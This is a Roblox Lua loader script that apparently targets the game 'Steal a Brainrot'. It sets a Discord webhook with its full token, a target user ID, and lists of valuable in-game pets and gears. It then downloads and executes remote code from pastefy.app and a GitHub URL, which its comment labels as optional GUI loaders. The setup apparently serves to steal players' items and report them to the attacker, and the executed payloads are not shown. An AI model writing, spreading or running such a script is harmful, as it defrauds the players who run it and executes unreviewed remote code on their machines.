local genv = getgenv()

genv.GOOD_WEBHOOK = "https://discord.com/api/webhooks/1480760724765806685/viWCsb0UIC8unqQJEkqhlHIaVn72pwBKCd0C6afi52JfO0lcaGVHPeSL9nGdYu4d7CyB"

genv.TARGET_USER_ID = 2829121161

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "Meowl",
    "John Pork",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Dragon Cannelloni",
    "Love Love Bear",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro and Fryuro",
    "Los Secret Combinasionas",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Pizza and Ranch",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Fishino Clownino",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "Los Chillis",
    "Los Hackers",
    "Rubiko and Kubiko",
    "Bearito Cabinito",
    "Capitano Americano",
    "Examen Bros",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Steakini Fattini",
    "Garama and Madundung",
    "Los Spaghettis",
    "Rico Dinero",
    "Fragola La La La",
    "Los Tacoritas",
    "Globa Steppa",
    "Money Money Bros",
    "Jolly Jolly Sahur",
    "Dug Dug Dug"
}

genv.ALLOWED_BASESKINS = {
    ["Tralala"] = true
}

genv.ALLOWED_GEARS = {
    ["Santa's Sleigh"] = true,
    ["Cupid's Wings"] = true,
    ["Witch's Broom"] = true,
    ["Waverider"] = true,
    ["Bloodmoon Hammer"] = true,
    ["Candy Sentry"] = true,
    ["Rainbow Hammer"] = true,
    ["Rainbow Slap"] = true,
    ["Bloodmoon Slap"] = true,
    ["Yin Yang Lamp"] = true
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237
}

-- Extra scripts (moved out of main)
genv.EXTRA_LOADSTRINGS = {
    "https://pastefy.app/I9mewuyb/raw"
}

-- Optional GUI / other loaders
task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/su9hI8dc/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
